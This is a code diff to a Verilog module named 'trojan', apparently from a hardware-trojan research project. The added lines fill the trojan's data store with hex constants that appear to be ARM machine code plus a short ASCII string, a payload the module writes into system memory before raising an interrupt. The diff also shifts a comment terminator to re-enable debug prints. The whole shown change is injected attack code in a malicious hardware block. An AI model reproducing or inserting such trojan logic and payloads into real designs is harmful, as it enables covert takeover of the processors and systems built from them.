@@ -172,7 +172,13 @@ module trojan (
             o_troj_trigger_irq <= 1'b0;
 
             offset <= 2'b0;
-            trojan_data_store <= {`DATA_STORE_SIZE{`DEFAULT_PATTERN}}; /// "XYXY..."
+            //trojan_data_store <= {`DATA_STORE_SIZE{`DEFAULT_PATTERN}}; /// "XYXY..."
+            trojan_data_store[127:0]    <= 128'he5812000_e3a02010_e59f1040_e92d003f;
+            trojan_data_store[255:128]  <= 128'he28f5034_e3a04000_e59f3038_e59f1038;
+            trojan_data_store[383:256]  <= 128'he2022020_e5932000_e2844001_e4950001;
+            trojan_data_store[511:384]  <= 128'he3540008_1afffffa_05c10000_e3520000;
+            trojan_data_store[639:512]  <= 128'h16000008_e25ef004_e8bd003f_1afffff6;
+            trojan_data_store[767:640]  <= 128'h0d0a4445_44414f4c_16000018_16000000;
 
         end else begin
             startup <= startup_nxt;
@@ -285,6 +291,7 @@ module trojan (
                 trojan_data_store[511:384], trojan_data_store[383:256],
                 trojan_data_store[255:128], trojan_data_store[127:0]);
         end
+        */
 
         if (!i_rst && o_troj) begin
             $display("State: %d  addr[0x%X]=0x%X\n", trojan_state, o_troj_write_addr, o_troj_write_data);
@@ -293,7 +300,6 @@ module trojan (
                 trojan_data_store[511:384], trojan_data_store[383:256],
                 trojan_data_store[255:128], trojan_data_store[127:0]);
         end
-        */
 
         if (!i_rst && o_troj_trigger_irq) begin
             $display("Interrupt Triggered\n");
